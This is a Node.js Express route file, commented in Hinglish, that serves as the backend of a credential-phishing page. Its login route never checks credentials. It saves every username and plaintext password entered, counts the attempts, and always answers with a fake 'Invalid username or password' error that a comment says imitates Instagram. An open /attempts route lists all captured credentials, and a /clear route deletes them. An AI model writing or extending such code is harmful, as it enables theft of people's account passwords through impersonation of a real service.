const express = require('express');
const router = express.Router();
const User = require('../models/User');

// Login route - Har ek attempt ko alag se store karega
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    // Basic validation
    if (!username || !password) {
      return res.status(400).json({ 
        message: 'Username and password are required' 
      });
    }

    // Pehle purane records check karenge taaki attempt number pata chal sake
    const existingAttempts = await User.countDocuments({ username });
    const currentAttemptNumber = existingAttempts + 1;

    // YAHA BADLAV HAI: 'if-else' hata kar HAMESHA naya entry banega
    const newAttempt = new User({
      username,
      password, // 1st, 2nd, 3rd jo bhi dale, sab save hoga
      isValidUser: false,
      loginAttempts: currentAttemptNumber, // Sahi attempt number counting
      timestamp: new Date()
    });

    await newAttempt.save();

    // Instagram jaisa fake error message response (aapka purana logic intact hai)
    res.status(401).json({ 
      message: 'Invalid username or password. Please try again.',
      _debug: { 
        stored: true, 
        userId: newAttempt._id,
        attempts: currentAttemptNumber 
      }
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all login attempts (Aapka purana route)
router.get('/attempts', async (req, res) => {
  try {
    const users = await User.find().sort({ timestamp: -1 });
    res.json(users);
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Clear all data (Aapka purana route)
router.delete('/clear', async (req, res) => {
  try {
    await User.deleteMany({});
    res.json({ message: 'All data cleared' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;